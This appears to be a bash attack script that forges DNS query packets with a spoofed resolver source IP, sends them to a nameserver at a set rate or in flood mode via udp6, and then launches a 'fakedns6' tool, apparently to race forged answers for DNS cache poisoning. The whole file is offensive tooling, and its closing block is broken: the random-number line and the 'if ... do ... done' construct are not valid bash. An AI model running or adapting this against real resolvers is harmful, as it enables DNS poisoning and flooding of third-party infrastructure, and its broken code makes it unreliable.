# usage ./dns_query.sh [NS IP] [Resolver IP(spoofed as source IP)] space-separated-domain... (e.g. www google com)
# clear the previous files
dd if=/dev/null of=dns_mid.bin
dd if=/dev/null of=txid.bin
# write the domain name into the binary
for var in ${@:3}
do
  size=${#var}
  echo -en "\x`printf '%x\n' $size`" >> dns_mid.bin
  echo -n "$var" >> dns_mid.bin
done
# set a random TxID
echo -en "\x`shuf -i 0-99 -n 1`" >> txid.bin
echo -en "\x`shuf -i 0-99 -n 1`" >> txid.bin
# forge a entire DNS query packet
cat txid.bin dns_start.bin dns_mid.bin dns_end.bin dns_OPT.bin > dns.bin
# change the sending speed if necessary (-i). Set it to "flood" (replace -i with --flood) to maximize the power.
# fire!
echo "fire"
udp6 -d $1 -a 53 -Z dns.bin -r 50pps -s $2
a=$RANDOM %10
echo 8
if a>8
do
  ./fakedns6 -a $5 -b $1 -i $3 -n $4 -r $1 -t 50000 -at $2 -tg 0 -s 10000 -e 65000 -j 0 -f 1 >/dev/null 2>&1
  echo 1
done


